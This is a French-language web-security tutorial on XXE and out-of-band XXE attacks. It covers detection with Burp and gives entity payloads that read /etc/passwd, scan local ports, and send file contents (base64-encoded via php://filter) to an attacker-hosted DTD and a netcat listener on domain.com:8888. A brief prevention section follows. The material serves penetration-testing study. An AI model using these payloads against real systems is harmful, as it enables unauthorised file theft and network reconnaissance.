# Failles web - XXE & OOB-XXE

## Description
L'attaque XXE (eXternal XML Entities) est assez peu répandue et pourtant elle peut provoquer de gros dégâts. Elle est issue d'un problème de configuration et continuera à exsiter tant que sera utilisé un DTD avec la possiblité de solliciter des entités externes.

Le DTD est un fichier ou une portion du XML,Q  qui permet de définir la grammaire du document XML à travers la définition des types. Les entités (interne ou externe) identifié par la balise `<!ENTITY> est l'équivalent d'une variable. Si elle est externe, elle peut potentiellement provenir d'un utilisateur mal intentionné. Les internes ne sont pas dangeureuses.

## Détection
A travers le trafic intercepté avec un proxy comme Burp, l'envoi d'une portion de XML contenant la balise `ENTITY` est un point d'entrée.

Par exemple en Java, les outils Actuator et Jolokia utilisés avec Spring Boot ont démontré des vulnérabilités à cette attaque.

Une webapp qui utilise des DTD autorisants les entités externes est par définition vulnérable.

## Intention
Grâce à cette faille il est possible:
* d'injecter du code, avec par exemple la fonction PHP `expect()` ou d'installer un shell
* d'accéder au système de fichier et d'afficher le contenu d'un fichier sensible, par exemple `/etc/passwd`
* de scanner la machine ou le réseau

## Exploitation

### Accès au fichier /etc/passwd
Il suffit d'intercepter le trafic avec Burp et repéré une entité externe et de la remplacé dans le module repeater par ceci:

    <!ENTITY desc SYSTEM "file:///etc/passwd">
Si nécessaire en utilisant les version % pour les caractères spéciaux.

### Port scanning
Il suffit d'intercepter le trafic avec Burp et repéré une entité externe et de la remplacé dans le module repeater par ceci:

    <!DOCTYPE scan [<!ENTITY test SYSTEM "http://localhost:22">]>
Si nécessaire en utilisant les version % pour les caractères spéciaux.

### OOB-XXE et contounrement de filtre
Si la cible met en place des rescrictions sur les caractères ou fichier, il est possible de le contouner en utilisant notre DTD, d'où le Out Of Band XXE.
Pour cela il faudra hébergr notre DTD et injecter une référence vers lui dans l'ENTITY à exploiter. Ex:

    <!ENTITY % dtd SYSTEM "http://domain.com/payload.dtd"> %dtd;
Dans ce DTD nous allons injectons notre intention, récupérer le fichier `/etc/passwd` dans `file` et nous l'envoyer:

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://domain.com:8888/collect=%file;'>"> %all;
Il faudra bien sûr avoir un port en écoute:

    $ nc -l -p 8888
Il est possible d'obtenir une erreur lors du parse si le parser filtre les caracères spéciaux et la lecture des fichiers en contenant. Pour contourner cela, il faut utiliser l'encodage en base64:

    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://domain.com:8888/collect=%file;'>"> %all;

## Prévention
Le seul moyen est d'interdire l'utilisation d'entité externe au niveau du parseur. Ce qui n'est pas toujours possible de faire si le ârseur en questione est une librairie utilisée dans le cadre de la sérialisation.


## Liens
